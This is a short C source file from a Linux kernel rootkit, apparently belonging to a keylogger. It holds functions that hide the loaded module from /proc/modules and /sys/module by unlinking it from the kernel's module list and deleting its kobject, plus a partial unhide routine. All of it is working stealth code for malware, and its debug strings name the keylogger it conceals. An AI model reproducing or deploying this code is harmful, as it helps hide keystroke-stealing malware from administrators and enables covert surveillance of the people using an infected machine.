// Rootkit hider
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kobject.h>
#include <linux/list.h>
#include "rootkit.h"

void hide_module(void)
{
    // Hide module
    list_del(&THIS_MODULE->list); // hide from /proc/modules
    kobject_del(&THIS_MODULE->mkobj.kobj); // hide from /sys/module/<modname>

    DBG_PRINT("Keylogger hidden and initialized\n");
}

void unhide_module(void)
{
    // No proper way to unhide in modern kernels
    // Unhide module
    // list_add(&THIS_MODULE->list, &modules); // show in /proc/modules
    kobject_add(&THIS_MODULE->mkobj.kobj, kernel_kobj, "%s", THIS_MODULE->name); // show in /sys/module/<modname>

    DBG_PRINT("Keylogger unhidden\n");
}
